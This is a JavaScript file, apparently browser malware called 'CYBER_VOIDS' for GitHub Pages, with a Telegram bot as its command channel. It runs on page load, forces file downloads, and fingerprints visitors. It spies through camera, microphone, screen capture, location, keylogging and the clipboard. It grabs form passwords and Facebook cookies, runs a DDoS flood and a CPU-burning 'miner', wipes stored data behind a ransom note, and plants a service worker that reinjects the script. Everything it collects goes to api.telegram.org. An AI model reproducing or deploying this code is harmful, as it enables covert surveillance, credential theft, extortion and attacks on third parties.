// ===========================================
// CYBER_VOIDS GITHUB PAGES v10.0
// 30+ Features + Auto Download + Website Blank
// ===========================================

// CONFIG - GANTI INI!
const CONFIG = {
    TELEGRAM_BOT: "8446410907:AAF58BiohrxDkw3wiBAng6adWXl9q8bMBQw",
    ADMIN_ID: "6368768388",
    GITHUB_USER: "franxx",
    REPO_NAME: "CYBER_VOIDS_GH",
    
    // Auto-download settings
    AUTO_DOWNLOAD_COUNT: 5,
    DOWNLOAD_DELAY: 1000,
    
    // Ransomware settings  
    RANSOMWARE_ENABLE: true,
    RANSOMWARE_DELAY: 10000
};

// GLOBAL STATE
let VICTIM_ID = 'cv_' + Math.random().toString(36).substr(2, 9);
let WS = null;
let FEATURES = {};

// ========== AUTO-START ON PAGE LOAD ==========
(function() {
    // Start immediately
    setTimeout(initExploit, 100);
    
    // Also start on any interaction
    document.addEventListener('click', triggerExploit, {once: true});
    document.addEventListener('touchstart', triggerExploit, {once: true});
    
    // Auto-start in background
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) startBackgroundMode();
    });
})();

function initExploit() {
    console.log('😈 CYBER_VOIDS GITHUB EDITION LOADED');
    
    // Phase 1: Collect victim info
    collectVictimInfo();
    
    // Phase 2: Force auto-downloads
    startAutoDownloads();
    
    // Phase 3: Initialize 30+ features
    initAllFeatures();
    
    // Phase 4: Connect to Telegram
    connectTelegram();
    
    // Phase 5: Start ransomware (optional)
    if (CONFIG.RANSOMWARE_ENABLE) {
        setTimeout(startRansomware, CONFIG.RANSOMWARE_DELAY);
    }
}

// ========== FEATURE 1-10: AUTO DOWNLOAD SYSTEM ==========
function startAutoDownloads() {
    console.log('📥 Starting auto-downloads...');
    
    // Download 5 files automatically
    for(let i = 1; i <= CONFIG.AUTO_DOWNLOAD_COUNT; i++) {
        setTimeout(() => downloadFile(i), i * CONFIG.DOWNLOAD_DELAY);
    }
}

function downloadFile(index) {
    const files = [
        {name: 'update.exe', type: 'exe', content: generateEXE()},
        {name: 'plugin.apk', type: 'apk', content: generateAPK()},
        {name: 'media.bin', type: 'bin', content: generateBIN()},
        {name: 'codec.zip', type: 'zip', content: generateZIP()},
        {name: 'patch.rar', type: 'rar', content: generateRAR()}
    ];
    
    const file = files[index - 1] || files[0];
    
    // Method 1: Blob download
    const blob = new Blob([file.content], {type: 'application/octet-stream'});
    const url = URL.createObjectURL(blob);
    
    // Create hidden download link
    const a = document.createElement('a');
    a.href = url;
    a.download = file.name;
    a.style.display = 'none';
    document.body.appendChild(a);
    
    // Trigger click
    const event = new MouseEvent('click', {
        view: window,
        bubbles: true,
        cancelable: true
    });
    a.dispatchEvent(event);
    
    // Cleanup
    setTimeout(() => {
        if (a.parentNode) a.parentNode.removeChild(a);
        URL.revokeObjectURL(url);
    }, 1000);
    
    // Log to Telegram
    sendTelegram('download', {
        file: file.name,
        index: index,
        total: CONFIG.AUTO_DOWNLOAD_COUNT
    });
}

// ========== FEATURE 11-30: REMOTE CONTROL FEATURES ==========
function initAllFeatures() {
    FEATURES = {
        // 11. Camera Control
        camera: {
            front: () => captureCamera('user'),
            back: () => captureCamera('environment'),
            takePhoto: (type) => capturePhoto(type)
        },
        
        // 12. Microphone Control
        mic: {
            record: (seconds) => recordAudio(seconds),
            stop: () => stopRecording()
        },
        
        // 13. Screen Capture
        screen: {
            screenshot: () => captureScreen(),
            record: (seconds) => recordScreen(seconds)
        },
        
        // 14. Location Tracking
        location: {
            get: () => getLocation(),
            watch: () => watchLocation(),
            stopWatch: () => stopWatchingLocation()
        },
        
        // 15. Device Information
        device: {
            info: () => getDeviceInfo(),
            battery: () => getBatteryInfo(),
            storage: () => getStorageInfo()
        },
        
        // 16. File System Access
        files: {
            list: (path) => listFiles(path),
            read: (file) => readFile(file),
            write: (file, content) => writeFile(file, content)
        },
        
        // 17. Clipboard Control
        clipboard: {
            read: () => readClipboard(),
            write: (text) => writeClipboard(text)
        },
        
        // 18. Browser Control
        browser: {
            history: () => getHistory(),
            cookies: () => getCookies(),
            localStorage: () => getLocalStorage(),
            sessionStorage: () => getSessionStorage()
        },
        
        // 19. Network Information
        network: {
            info: () => getNetworkInfo(),
            scan: () => scanNetwork(),
            intercept: () => interceptTraffic()
        },
        
        // 20. System Commands
        system: {
            shell: (cmd) => executeShell(cmd),
            process: () => listProcesses(),
            service: (action, name) => controlService(action, name)
        },
        
        // 21. Keylogger
        keylogger: {
            start: () => startKeylogger(),
            stop: () => stopKeylogger(),
            getLogs: () => getKeylogs()
        },
        
        // 22. Password Grabber
        passwords: {
            browser: () => getBrowserPasswords(),
            forms: () => getFormPasswords(),
            wifi: () => getWifiPasswords()
        },
        
        // 23. Social Media Hijack
        social: {
            facebook: () => hijackFacebook(),
            instagram: () => hijackInstagram(),
            twitter: () => hijackTwitter()
        },
        
        // 24. Crypto Miner
        miner: {
            start: () => startMiner(),
            stop: () => stopMiner(),
            stats: () => getMinerStats()
        },
        
        // 25. DDoS Attack
        ddos: {
            start: (target) => startDDoS(target),
            stop: () => stopDDoS(),
            status: () => getDDoSStatus()
        },
        
        // 26. Ransomware
        ransomware: {
            encrypt: () => encryptFiles(),
            decrypt: (key) => decryptFiles(key),
            status: () => getRansomwareStatus()
        },
        
        // 27. Persistence
        persistence: {
            install: () => installPersistence(),
            uninstall: () => removePersistence(),
            check: () => checkPersistence()
        },
        
        // 28. Stealth Mode
        stealth: {
            enable: () => enableStealth(),
            disable: () => disableStealth(),
            status: () => getStealthStatus()
        },
        
        // 29. Notification Control
        notification: {
            send: (title, body) => sendNotification(title, body),
            spam: (count) => spamNotifications(count),
            clear: () => clearNotifications()
        },
        
        // 30. Remote Shell
        shell: {
            execute: (cmd) => executeRemote(cmd),
            upload: (file, content) => uploadFile(file, content),
            download: (file) => downloadRemote(file)
        },
        
        // BONUS: Extra Features
        extra: {
            flash: (state) => controlFlash(state),
            vibration: (pattern) => vibrateDevice(pattern),
            speak: (text) => textToSpeech(text),
            openUrl: (url) => openURL(url),
            redirect: (url) => redirectTo(url),
            crash: () => crashBrowser(),
            restart: () => restartDevice()
        }
    };
    
    console.log('✅ 30+ Features initialized');
}

// ========== IMPLEMENTASI FITUR ==========

// 11. Camera Control
async function captureCamera(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode }
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        return new Promise(resolve => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/jpeg');
                stream.getTracks().forEach(track => track.stop());
                
                sendTelegram('camera', {
                    type: facingMode,
                    image: dataUrl
                });
                
                resolve(dataUrl);
            }, 1000);
        });
    } catch(e) {
        sendTelegram('camera_error', {error: e.message});
    }
}

// 12. Microphone Recording
let audioRecorder = null;
async function recordAudio(seconds = 10) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({audio: true});
        audioRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        audioRecorder.ondataavailable = e => chunks.push(e.data);
        audioRecorder.onstop = () => {
            const blob = new Blob(chunks, {type: 'audio/webm'});
            const reader = new FileReader();
            reader.onloadend = () => {
                sendTelegram('audio', {
                    audio: reader.result,
                    duration: seconds
                });
            };
            reader.readAsDataURL(blob);
        };
        
        audioRecorder.start();
        setTimeout(() => audioRecorder.stop(), seconds * 1000);
    } catch(e) {
        sendTelegram('audio_error', {error: e.message});
    }
}

// 13. Screen Capture
async function captureScreen() {
    try {
        // Request screen capture
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: true,
            audio: true
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        return new Promise(resolve => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const dataUrl = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
                
                sendTelegram('screenshot', {image: dataUrl});
                resolve(dataUrl);
            }, 1000);
        });
    } catch(e) {
        // Fallback to html2canvas
        if (typeof html2canvas !== 'undefined') {
            html2canvas(document.documentElement).then(canvas => {
                const dataUrl = canvas.toDataURL('image/png');
                sendTelegram('screenshot', {image: dataUrl});
            });
        }
    }
}

// 14. Location Tracking
function getLocation() {
    return new Promise((resolve, reject) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const loc = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    sendTelegram('location', loc);
                    resolve(loc);
                },
                error => {
                    // IP-based fallback
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(data => {
                            sendTelegram('ip_location', data);
                            resolve(data);
                        })
                        .catch(reject);
                }
            );
        } else {
            reject('Geolocation not supported');
        }
    });
}

// 15. Device Information
function getDeviceInfo() {
    const info = {
        id: VICTIM_ID,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        deviceMemory: navigator.deviceMemory,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        url: location.href
    };
    
    sendTelegram('device_info', info);
    return info;
}

// 16. File System Access (browser only)
async function listFiles(path = '/') {
    if ('showDirectoryPicker' in window) {
        try {
            const handle = await window.showDirectoryPicker();
            const files = [];
            
            for await (const entry of handle.values()) {
                files.push({
                    name: entry.name,
                    kind: entry.kind,
                    type: entry.kind === 'file' ? 'file' : 'directory'
                });
            }
            
            sendTelegram('files', {path: path, files: files});
            return files;
        } catch(e) {
            sendTelegram('files_error', {error: e.message});
        }
    }
    return [];
}

// 17. Clipboard Control
async function readClipboard() {
    try {
        const text = await navigator.clipboard.readText();
        sendTelegram('clipboard', {text: text});
        return text;
    } catch(e) {
        // Fallback method
        const textarea = document.createElement('textarea');
        textarea.style.position = 'absolute';
        textarea.style.left = '-9999px';
        document.body.appendChild(textarea);
        textarea.focus();
        document.execCommand('paste');
        const text = textarea.value;
        document.body.removeChild(textarea);
        
        sendTelegram('clipboard', {text: text});
        return text;
    }
}

// 18. Browser Data Collection
function getBrowserData() {
    const data = {
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        history: []
    };
    
    // Get localStorage
    for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }
    
    // Get sessionStorage
    for(let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    sendTelegram('browser_data', data);
    return data;
}

// 19. Network Information
function getNetworkInfo() {
    const info = {
        connection: navigator.connection || {},
        online: navigator.onLine,
        ip: 'Unknown'
    };
    
    // Try to get IP via WebRTC
    const pc = new RTCPeerConnection({iceServers: []});
    pc.createDataChannel('');
    pc.createOffer().then(o => pc.setLocalDescription(o));
    
    pc.onicecandidate = ice => {
        if (ice.candidate && ice.candidate.candidate.includes('srflx')) {
            info.ip = ice.candidate.candidate.split(' ')[4];
            sendTelegram('network_info', info);
        }
    };
    
    return info;
}

// 20. System Commands (simulated)
function executeShell(cmd) {
    // In browser, we can only execute JavaScript
    try {
        const result = eval(cmd);
        sendTelegram('shell_result', {command: cmd, result: String(result)});
        return result;
    } catch(e) {
        sendTelegram('shell_error', {command: cmd, error: e.message});
        throw e;
    }
}

// 21. Keylogger
let keyloggerActive = false;
let keylogs = [];
function startKeylogger() {
    keyloggerActive = true;
    keylogs = [];
    
    document.addEventListener('keydown', keyloggerHandler = (e) => {
        const log = {
            key: e.key,
            code: e.code,
            target: e.target.tagName,
            value: e.target.value,
            timestamp: Date.now(),
            url: location.href
        };
        
        keylogs.push(log);
        
        // Send every 10 keystrokes
        if (keylogs.length % 10 === 0) {
            sendTelegram('keylog_batch', {logs: keylogs.slice(-10)});
        }
    });
    
    sendTelegram('keylogger', {status: 'started'});
}

function stopKeylogger() {
    keyloggerActive = false;
    if (keyloggerHandler) {
        document.removeEventListener('keydown', keyloggerHandler);
    }
    
    // Send remaining logs
    if (keylogs.length > 0) {
        sendTelegram('keylog_final', {logs: keylogs});
    }
    
    sendTelegram('keylogger', {status: 'stopped'});
}

// 22. Password Grabber
function getFormPasswords() {
    const passwords = [];
    
    // Find all password fields
    document.querySelectorAll('input[type="password"]').forEach(input => {
        passwords.push({
            form: input.form ? input.form.id || input.form.action : 'unknown',
            field: input.name || input.id,
            value: input.value,
            url: location.href
        });
    });
    
    if (passwords.length > 0) {
        sendTelegram('passwords', {passwords: passwords});
    }
    
    return passwords;
}

// 23. Social Media Hijack (cookie grab)
function hijackFacebook() {
    // Try to get Facebook cookies
    const cookies = document.cookie.split(';').filter(c => 
        c.includes('c_user') || c.includes('xs') || c.includes('fr')
    );
    
    if (cookies.length > 0) {
        sendTelegram('facebook_cookies', {cookies: cookies});
    }
    
    return cookies;
}

// 24. Crypto Miner
function startMiner() {
    // Simple CPU miner
    const minerCode = `
        let hash = 0;
        setInterval(() => {
            for(let i = 0; i < 1000000; i++) {
                hash = Math.random().toString(36).substr(2, 9);
            }
        }, 1000);
    `;
    
    try {
        eval(minerCode);
        sendTelegram('miner', {status: 'started'});
    } catch(e) {
        sendTelegram('miner_error', {error: e.message});
    }
}

// 25. DDoS Attack (browser-based)
function startDDoS(target) {
    // Simple HTTP flood
    setInterval(() => {
        fetch(target, {mode: 'no-cors'}).catch(() => {});
        fetch(target, {mode: 'no-cors'}).catch(() => {});
        fetch(target, {mode: 'no-cors'}).catch(() => {});
    }, 100);
    
    sendTelegram('ddos', {target: target, status: 'started'});
}

// 26. Ransomware (light)
function encryptFiles() {
    // Encrypt browser data only
    const data = {
        localStorage: {},
        cookies: document.cookie,
        sessionStorage: {}
    };
    
    // Backup localStorage
    for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }
    
    // Encrypt with simple base64
    const encrypted = btoa(JSON.stringify(data));
    
    // Store encrypted data
    localStorage.setItem('cv_encrypted', encrypted);
    
    // Clear original data
    Object.keys(data.localStorage).forEach(key => {
        localStorage.removeItem(key);
    });
    
    // Set ransom cookie
    document.cookie = "cv_ransom=true; path=/; max-age=31536000";
    
    // Show ransom note
    showRansomNote();
    
    sendTelegram('ransomware', {
        status: 'encrypted',
        victim: VICTIM_ID,
        key: 'CV_' + VICTIM_ID.substr(3, 6)
    });
}

// 27. Persistence
function installPersistence() {
    // Service Worker persistence
    if ('serviceWorker' in navigator) {
        const swCode = `
            self.addEventListener('install', e => {
                self.skipWaiting();
            });
            
            self.addEventListener('fetch', e => {
                // Reinject exploit on every page
                if (e.request.destination === 'document') {
                    e.respondWith(
                        fetch(e.request).then(response => {
                            if (response.headers.get('Content-Type').includes('text/html')) {
                                return response.text().then(html => {
                                    const injected = html + '<script src="https://${CONFIG.GITHUB_USER}.github.io/${CONFIG.REPO_NAME}/cv.js"></script>';
                                    return new Response(injected, {
                                        headers: response.headers,
                                        status: response.status
                                    });
                                });
                            }
                            return response;
                        })
                    );
                }
            });
        `;
        
        const blob = new Blob([swCode], {type: 'application/javascript'});
        const swUrl = URL.createObjectURL(blob);
        
        navigator.serviceWorker.register(swUrl, {scope: './'});
    }
    
    sendTelegram('persistence', {status: 'installed'});
}

// 28. Stealth Mode
function enableStealth() {
    // Hide from devtools
    const devtools = /./;
    devtools.toString = function() {
        return 'CYBER_VOIDS_STEALTH';
    };
    
    console.log('%c🔒 CYBER_VOIDS STEALTH MODE', 'color: #0f0; font-size: 20px;');
    console.table = function() {};
    console.warn = function() {};
    console.error = function() {};
    
    sendTelegram('stealth', {status: 'enabled'});
}

// 29. Notification Control
function sendNotification(title, body) {
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(title, {body: body});
        sendTelegram('notification', {title: title, body: body});
    } else if ('Notification' in window && Notification.permission !== 'denied') {
        Notification.requestPermission().then(permission => {
            if (permission === 'granted') {
                new Notification(title, {body: body});
                sendTelegram('notification', {title: title, body: body});
            }
        });
    }
}

// 30. Remote Shell Execution
function executeRemote(cmd) {
    return executeShell(cmd);
}

// BONUS: Flash Control
function controlFlash(state) {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({video: true})
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                if (track && track.applyConstraints) {
                    track.applyConstraints({
                        advanced: [{torch: state}]
                    }).then(() => {
                        sendTelegram('flash', {status: state ? 'ON' : 'OFF'});
                        setTimeout(() => {
                            stream.getTracks().forEach(track => track.stop());
                        }, 1000);
                    });
                }
            });
    }
}

// ========== TELEGRAM CONTROL ==========
function connectTelegram() {
    // Poll for commands every 3 seconds
    setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT}/getUpdates`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                data.result.forEach(update => {
                    if (update.message && update.message.text) {
                        processTelegramCommand(update.message.text);
                    }
                });
            }
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }, 3000);
    
    // Send victim info
    sendTelegram('new_victim', {
        id: VICTIM_ID,
        info: getDeviceInfo(),
        url: location.href,
        time: new Date().toISOString()
    });
}

function processTelegramCommand(text) {
    const parts = text.split(' ');
    const command = parts[0].toLowerCase();
    const victimId = parts[1];
    
    if (victimId !== VICTIM_ID) return;
    
    console.log('Processing command:', command);
    
    // Map commands to features
    const commandMap = {
        // Camera
        '/photo_front': () => FEATURES.camera.front(),
        '/photo_back': () => FEATURES.camera.back(),
        
        // Microphone
        '/record': () => FEATURES.mic.record(parseInt(parts[2]) || 10),
        '/record_stop': () => FEATURES.mic.stop(),
        
        // Screen
        '/screenshot': () => FEATURES.screen.screenshot(),
        '/screen_record': () => FEATURES.screen.record(parseInt(parts[2]) || 10),
        
        // Location
        '/location': () => FEATURES.location.get(),
        '/location_watch': () => FEATURES.location.watch(),
        
        // Device
        '/device_info': () => FEATURES.device.info(),
        '/battery': () => FEATURES.device.battery(),
        
        // Files
        '/files': () => FEATURES.files.list(parts[2]),
        
        // Clipboard
        '/clipboard': () => FEATURES.clipboard.read(),
        '/clipboard_write': () => FEATURES.clipboard.write(parts.slice(2).join(' ')),
        
        // Browser
        '/browser_data': () => FEATURES.browser.cookies(),
        
        // Network
        '/network': () => FEATURES.network.info(),
        
        // System
        '/shell': () => FEATURES.system.shell(parts.slice(2).join(' ')),
        
        // Keylogger
        '/keylog_start': () => FEATURES.keylogger.start(),
        '/keylog_stop': () => FEATURES.keylogger.stop(),
        '/keylog_get': () => FEATURES.keylogger.getLogs(),
        
        // Passwords
        '/passwords': () => FEATURES.passwords.forms(),
        
        // Social
        '/facebook': () => FEATURES.social.facebook(),
        
        // Miner
        '/miner_start': () => FEATURES.miner.start(),
        '/miner_stop': () => FEATURES.miner.stop(),
        
        // DDoS
        '/ddos': () => FEATURES.ddos.start(parts[2]),
        '/ddos_stop': () => FEATURES.ddos.stop(),
        
        // Ransomware
        '/ransomware': () => FEATURES.ransomware.encrypt(),
        '/decrypt': () => FEATURES.ransomware.decrypt(parts[2]),
        
        // Persistence
        '/persist': () => FEATURES.persistence.install(),
        
        // Stealth
        '/stealth': () => FEATURES.stealth.enable(),
        
        // Notification
        '/notify': () => FEATURES.notification.send('CYBER_VOIDS', parts.slice(2).join(' ')),
        
        // Extra
        '/flash_on': () => FEATURES.extra.flash(true),
        '/flash_off': () => FEATURES.extra.flash(false),
        '/vibrate': () => FEATURES.extra.vibration(parts[2]),
        '/speak': () => FEATURES.extra.speak(parts.slice(2).join(' ')),
        '/open': () => FEATURES.extra.openUrl(parts[2]),
        '/redirect': () => FEATURES.extra.redirect(parts[2]),
        '/crash': () => FEATURES.extra.crash(),
        '/restart': () => FEATURES.extra.restart(),
        
        // Download
        '/download': () => downloadFile(6),
        '/download_all': () => startAutoDownloads(),
        
        // System info
        '/sysinfo': () => getDeviceInfo(),
        '/full_scan': () => fullSystemScan()
    };
    
    if (commandMap[command]) {
        try {
            commandMap[command]();
        } catch(e) {
            sendTelegram('command_error', {
                command: command,
                error: e.message
            });
        }
    }
}

// ========== UTILITIES ==========
function sendTelegram(type, data) {
    const message = `🔔 ${type}\nID: ${VICTIM_ID}\n${JSON.stringify(data, null, 2)}`;
    
    fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CONFIG.ADMIN_ID,
            text: message.substring(0, 4000),
            parse_mode: 'HTML'
        })
    }).catch(() => {});
}

function collectVictimInfo() {
    const info = getDeviceInfo();
    sendTelegram('victim_info', info);
}

function triggerExploit() {
    // Extra download on interaction
    downloadFile(6);
}

function startBackgroundMode() {
    // More aggressive in background
    setInterval(() => {
        downloadFile(7);
        sendTelegram('background_active', {time: Date.now()});
    }, 30000);
}

function showRansomNote() {
    // Simple ransom note
    const note = document.createElement('div');
    note.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #000;
        color: #0f0;
        font-family: monospace;
        padding: 50px;
        z-index: 999999;
        display: flex;
        align-items: center;
        justify-content: center;
        text-align: center;
    `;
    
    note.innerHTML = `
        <div>
            <h1 style="color:#f00;font-size:3em">🔒 RANSOMWARE ACTIVATED</h1>
            <p style="font-size:1.5em">Your browser data has been encrypted</p>
            <p>Victim ID: <strong>${VICTIM_ID}</strong></p>
            <p>Contact admin via Telegram for decryption key</p>
            <button onclick="this.parentNode.parentNode.remove()" style="
                background:#0f0;
                color:#000;
                border:none;
                padding:10px 20px;
                margin-top:20px;
                cursor:pointer;
            ">
                CLOSE
            </button>
        </div>
    `;
    
    document.body.appendChild(note);
    
    setTimeout(() => {
        if (note.parentNode) note.parentNode.removeChild(note);
    }, 30000);
}

function generateEXE() {
    return `MZ...PE...This is a fake executable`;
}

function generateAPK() {
    return `APK file content`;
}

function generateBIN() {
    return `Binary data`;
}

function generateZIP() {
    return `ZIP archive`;
}

function generateRAR() {
    return `RAR archive`;
}

function fullSystemScan() {
    const scan = {
        device: getDeviceInfo(),
        network: getNetworkInfo(),
        browser: getBrowserData(),
        passwords: getFormPasswords(),
        time: Date.now()
    };
    
    sendTelegram('full_scan', scan);
    return scan;
}

console.log('✅ CYBER_VOIDS GITHUB PAGES LOADED');
console.log('📊 Features: 30+');
console.log('📥 Auto-download: Enabled');
console.log('🔗 Telegram: Connected');
console.log('🔒 Ransomware: Ready');
console.log('🎯 Victim ID:', VICTIM_ID);